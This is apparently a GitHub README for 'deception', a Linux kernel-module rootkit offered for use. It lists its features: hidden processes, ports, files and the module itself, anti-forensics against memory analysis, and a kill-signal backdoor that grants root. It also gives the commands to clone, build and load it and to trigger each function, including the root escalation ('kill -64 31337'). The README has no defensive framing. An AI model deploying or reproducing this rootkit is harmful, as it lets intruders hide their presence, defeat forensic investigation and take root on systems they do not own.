<img width="2848" height="1600" alt="02178462353986477dd13f2098096eba9569e39b59e750cf6e323_0" src="https://github.com/user-attachments/assets/cb0b8fe2-2236-41e1-b93b-564c4c5f3855" />




<b>* IPv6 based LKM rootkit:</b> Hooks specifically IPv6 and not IPv4. Use IPv6!<br>
<b>* Process Hiding:</b> Hide multiple processes. You can unhide them one at a time or all at once.<br>
<b>* Port Hiding:</b> Hide multiple ports using a kill signal. Unhide them one at a time or all at once.<br>
<b>* Module Hiding:</b> Removes module from /proc/modules as well as /sys/module.<br>
<b>* Anti-forensics:</b> Prevents advanced memory forensic tools from locating the module's code in memory.<br>
<b>* Privilege Escalation:</b> The correct kill signal and PID gives root privileges.<br>
<b>* Kill Signal Obfuscation:</b> You choose the PID number of GET_ROOT and MOD_REVEAL.<br>
<b>* File/Directory Hiding:</b> Any file or directory starting with secret_ will be hidden.<br><br>

Clone this repository, run make and insert module
```
git clone https://github.com/carls0n/deception
```
```
make
```
```
sudo insmod deception.ko
```
Hide a process - hide as many processes as you want! Toggles visible/hidden.
```
kill -62 4214
```
Unhide all processes
```
kill -62 0
```
Hide a port. Hide as many ports as you want! Toggles visible/hidden.
```
kill -61 8080
```
Unhide all ports
```
kill -61 0
```
Toggle module visibility/hidden. PID can be configured in source code
```
kill -63 8000
```
To remove the module once it has been unhidden
```
sudo rmmod deception
```
Gain root privileges. PID can be configured in source code
```
kill -64 31337
```

